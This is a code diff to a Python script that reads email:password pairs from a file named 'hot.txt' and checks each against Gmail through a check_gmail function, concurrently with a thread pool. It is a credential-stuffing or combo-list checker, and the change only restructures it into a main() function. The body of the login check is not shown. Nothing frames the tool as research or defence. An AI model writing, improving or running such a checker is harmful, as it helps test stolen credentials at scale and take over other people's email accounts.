@@ -17,25 +17,27 @@ def check_gmail(email, password):
     except Exception as e:
         return f"{email}:{password} => Raw response: {str(e)}\n{traceback.format_exc()}"
 
-def process_accounts(file_path):
-    results = []
-    with open(file_path, 'r') as file:
-        accounts = file.readlines()
+def process_account(line):
+    email, password = line.strip().split(":")
+    return check_gmail(email, password)
 
-    def handle_account(line):
-        email, password = line.strip().split(":")
-        response = check_gmail(email, password)
-        return response
+def main():
+    try:
+        with open("hot.txt", "r") as f:
+            combos = f.readlines()  # Read all email:password combinations
 
-    with concurrent.futures.ThreadPoolExecutor() as executor:
-        futures = [executor.submit(handle_account, line) for line in accounts]
-        for future in concurrent.futures.as_completed(futures):
-            results.append(future.result())
+        results = []
+        # Use ThreadPoolExecutor to process accounts concurrently
+        with concurrent.futures.ThreadPoolExecutor() as executor:
+            futures = [executor.submit(process_account, line) for line in combos]
+            for future in concurrent.futures.as_completed(futures):
+                results.append(future.result())
 
-    return results
+        for result in results:
+            print(result)
+
+    except Exception as e:
+        print(f"Error reading file or processing accounts: {str(e)}")
 
 if __name__ == "__main__":
-    input_file = "hot.txt"
-    results = process_accounts(input_file)
-    for result in results:
-        print(result)
+    main()
